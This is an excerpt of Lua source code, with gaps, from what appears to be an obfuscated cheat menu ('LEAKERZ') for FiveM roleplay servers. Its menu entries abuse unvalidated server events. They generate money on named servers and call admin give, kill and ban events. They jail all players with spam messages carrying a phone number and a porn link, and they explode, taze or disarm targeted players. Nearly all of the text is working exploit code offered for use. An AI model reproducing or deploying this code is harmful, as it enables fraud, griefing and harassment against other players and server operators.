                    elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ OurlifeRP") then
                        for i = 1, 100 do
                            TriggerServerEvent("route68_yacht_reb:reward")
                                end
                            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ HellGateRP") then
                                for i = 1, 100 do
                                    TriggerServerEvent("tostzdrapka:wygrankopremium")
                                        end
                                    elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ MangoRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent("tostzdrapka:wygranko")
                                                end
                                            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~ ImperiumRP") then
                                        for i = 1, 100 do
                                            TriggerServerEvent("tostdostawa:wykonanieMisji", kwota)
                                                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~Zdrapki ~r~x20") then
                                for i = 1, 20 do
            ...
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~payforplayer2") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('payforplayer2',result)
                end
            elseif LEAKERZ.sadh78asd7asgda('Money unemployed') then
                UnemployedMoney()
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~give_back") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent("esx_jobs:caution", "give_back", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~esx_truckerjob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('esx_truckerjob:pay', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveBank") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('AdminMenu:giveBank', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveCash") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                TriggerServerEvent('AdminMenu:giveCash', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~esx_gopostaljob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_gopostaljob:pay", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~esx_banksecurity") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_banksecurity:pay", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~esx_slotmachine") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_slotmachine:sv:2", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~lscustoms") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                    TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                end     
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~vrp_slotmachine") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                TriggerServerEvent("vrp_slotmachine:server:2", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~AdminMenu:giveDirtyMoney") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~Delivery") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent('delivery:success', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~Taxi") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent ('taxi:success', result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~Esx_Pilot and taxi") then
                    for i = 1, 10 do
                    ...
                    TriggerServerEvent('esx_taxijob:success')
                    TriggerServerEvent('esx_taxijob:success')
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~esx_garbagejob") then
                local result = KeyboardInput("Enter amount of money", "", 100000000)
                if result then
                    TriggerServerEvent("esx_garbagejob:pay", result)
                end 
            elseif LEAKERZ.sadh78asd7asgda("~g~~h~MONEY ~s~paycheck") then
                for i = 1, 20 do
                    TriggerServerEvent('paycheck:salary')
                end
            elseif LEAKERZ.sadh78asd7asgda("~s~Bank ~r~~h~Deposit") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
                TriggerServerEvent("bank:deposit", result)
                end
            elseif LEAKERZ.sadh78asd7asgda("~s~Bank ~r~~h~Withdraw ") then
                local result = KeyboardInput("Enter amount of money", "", 100)
                if result then
            ...
            LEAKERZ.sadha7sxzsa()
                elseif LEAKERZ.asdy7as12("ESXMisc") then
                    if LEAKERZ.sadh78asd7asgda("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~g~~h~ESX ~w~Get all licenses Drive") then
                    ...
                    TriggerServerEvent("dmv:success")
                                elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Brinks Job') then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Mechanic Job') then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Police Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Taxi Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Unicorn Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~VehicleShop') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Admin Tool') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                    local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Cartle Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~MC Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Gang Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Bloods Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Lost Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Mafia Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                    ...
                    elseif LEAKERZ.sadh78asd7asgda('~h~Drop Any ~g~Item ~h~From ~o~Taliban Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("MiscServerOptions") then
                if LEAKERZ.sadh78asd7asgda("~h~Send Discord Message") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~h~Send Police Car Advert") then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("VRPOptions") then
                if LEAKERZ.sadh78asd7asgda("~r~~h~VRP ~s~Give Money ~y~payGarage") then
                    local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
                    if result then
                        TriggerServerEvent("lscustoms:payGarage", {costs = -result})
                    end     
                elseif LEAKERZ.sadh78asd7asgda("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
                    local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
                    if result then
                    TriggerServerEvent("vrp_slotmachine:server:2", result)
                    end
                elseif LEAKERZ.sadh78asd7asgda("~r~~h~VRP ~s~Get driving license") then
                    TriggerServerEvent("dmv:success")
                elseif LEAKERZ.sadh78asd7asgda("~r~~h~VRP ~s~Bank Deposit") then
                    local result = KeyboardInput("Enter amount of money", "", 100)
                    if result then
                    TriggerServerEvent("bank:deposit", result)
                    end
                elseif LEAKERZ.sadh78asd7asgda("~r~~h~VRP ~s~Bank Withdraw ") then
                    local result = KeyboardInput("Enter amount of money", "", 100)
                    if result then
                    TriggerServerEvent("bank:withdraw", result)
                    end
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("ESXDrugs") then
                if LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~g~AndreasRP") then
                    for i = 0, 128 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~AquaCityRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "+48793014856 Dzwoncie!!!", 13371337)
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~HellGateRP") then
                    for i = 0, 128 do
                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~CityRP.xyz") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~BruklinRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("leanrp:SendMessage", GetPlayerServerId(i), 13371337, "Onion Executor!!", 13371337)
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~MangoRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellCoke")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~GalaxyRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startHarvestMeth")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~LimitRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startTransformMeth")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~OsiedleRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellMeth")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~CamorraRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startHarvestOpium")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~BoskieRP") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startTransformOpium")
                end
                elseif LEAKERZ.sadh78asd7asgda("~h~~g~Jail ~c~[nazwa server]") then
                    for i = 1, 5 do
                    TriggerServerEvent("esx_drugs:startSellOpium")
                end
                elseif LEAKERZ.sadh78asd7asgda("Jail All SKRT") then
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117") then
                    for i = 0, 128 do
                    if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LEAKERZ.saidhas78dhas(GetPlayerName(i).." ID = [~r~"..GetPlayerServerId(i).."~s~]"..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~ DEAD" or "~g~ ALIVE"), "PlayerOptionsMenu") then
                        SelectedPlayer = i
                    end
                end
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("PlayerOptionsMenu") then
                LEAKERZ.dasdjas78dhasd("PlayerOptionsMenu", "~h~Player ~s~[" .. GetPlayerName(SelectedPlayer) .. "]")
                if LEAKERZ.sadh78asd7asgda("Spectate", (Spectating and "~r~[SPECTATING]")) then
                    SpectatePlayer(SelectedPlayer)
                elseif LEAKERZ.sadh78asd7asgda("Teleport To Player") then
                    local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif LEAKERZ.sadh78asd7asgda("~g~Give ~s~Money") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Spawn ~h~~o~Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif LEAKERZ.saidhas78dhas('∑~h~~r~~w~ Spawn Menu', 'SpawnPeds') then
                elseif LEAKERZ.saidhas78dhas('∑~h~~b~Ram Vehicle Options', 'VehicleRamMenu') then
                elseif LEAKERZ.saidhas78dhas("∑~h~~r~Spawn Props On Player", "SpawnPropsMenu") then
                elseif LEAKERZ.saidhas78dhas("∑~h~~r~ESX Triggers", "ESXTriggers") then
                elseif LEAKERZ.sadh78asd7asgda("~r~Remove ~s~Money") then
                        local result = KeyboardInput("Enter amount of money to give", "", 100000000)
                        if result then
                        TriggerServerEvent('esx:removeInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
                        end
                elseif LEAKERZ.sadh78asd7asgda('~h~~p~change your clothes') then
                        ClonePedlol(SelectedPlayer)
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Give ~o~All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                elseif LEAKERZ.sadh78asd7asgda('~h~Remove ~r~All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Airstrike") then
                AirstrikePlayer(SelectedPlayer)
                elseif LEAKERZ.sadh78asd7asgda("~h~~o~Small invisible ~r~Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif LEAKERZ.sadh78asd7asgda("~r~Explode") then
                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
                elseif LEAKERZ.sadh78asd7asgda("Give ~b~Armor ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 33, 101.0, false, true, 0.0)
                --AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                elseif LEAKERZ.sadh78asd7asgda("~h~~r~Fake Sniper") then
                Fakesniper(SelectedPlayer)
                elseif LEAKERZ.sadh78asd7asgda("~h~~b~Taze Player") then
                TazePlayer(SelectedPlayer)
                elseif LEAKERZ.sadh78asd7asgda('Fire') then
                    FirePlayer(SelectedPlayer)
                elseif LEAKERZ.saidhas78dhas("Weapon Menu", "SingleWepPlayer") then
                elseif LEAKERZ.sadh78asd7asgda("Spawn Vehicle") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("Kick Vehicle") then
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                elseif LEAKERZ.sadh78asd7asgda("Teleport To Player and kick from vehicle") then
                    local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                    end
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12('ESXTriggers') then
                if LEAKERZ.sadh78asd7asgda('~h~~g~Open Inventory HUD') then
                    TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
                elseif LEAKERZ.sadh78asd7asgda("~g~Revive ~g~ESX") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) 
                elseif LEAKERZ.sadh78asd7asgda("Cuff ~g~ESX") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("~r~MelloTrainer ~s~KILL") then
                    TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
                elseif LEAKERZ.sadh78asd7asgda("~r~MelloTrainer ~s~BAN") then
                    TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
                elseif LEAKERZ.sadh78asd7asgda("~r~MelloTrainer ~s~KICK") then
                ...
                elseif LEAKERZ.sadh78asd7asgda("Jail") then      
                ...
                TriggerServerEvent("esx_jailer:sendToJail23239", GetPlayerServerId(i), 100000, "https://pornhub.com", 100000)
                TriggerServerEvent("esx_jvamesACailer:sendToJail132", GetPlayerServerId(i), 100000, "https://pornhub.com", 100000)
                TriggerServerEvent("dreamrpjail:jailPlayerdreamrp", GetPlayerServerId(closestPlayer), jailTime, reason)
                TriggerServerEvent("esx_jailer:sendToJailhype2", GetPlayerServerId(i), 454368438 * 60, "https://pornhub.com", 54485748)
                elseif LEAKERZ.sadh78asd7asgda("Unjail") then
                ...
                local LastName = FM.GetKeyboardInput("Enter LastName", "", 50)
                    ...
                    LEAKERZ.sadha7sxzsa()
                elseif LEAKERZ.asdy7as12("SpawnPropsMenu") then
                    if LEAKERZ.asdnjasj9asdljasdu(
                    ...
                    then
                    elseif LEAKERZ.asidhas89dg("Bone", { "Head", "Right Hand" }, asdja7sdasd, asdh8asdh, function(yagsd7asgd7asgdasd, saudygasuydguasdasd)
                        asdja7sdasd = yagsd7asgd7asgdasd
                        asdh8asdh = saudygasuydguasdasd
                    end)
                    then
                    elseif LEAKERZ.sadh78asd7asgda("Pudelko") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Kolczatki") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("wheel") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("prop_abat_roller_static") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp1") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp2") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp3") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp4") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp5") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp6") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                   ...
                   elseif LEAKERZ.sadh78asd7asgda("ramp7") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                ...
                elseif LEAKERZ.sadh78asd7asgda('ball') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    ...
                    elseif LEAKERZ.sadh78asd7asgda("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                ...
                LEAKERZ.sadha7sxzsa()
            elseif LEAKERZ.asdy7as12("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if LEAKERZ.sadh78asd7asgda(allWeapons[i]) then
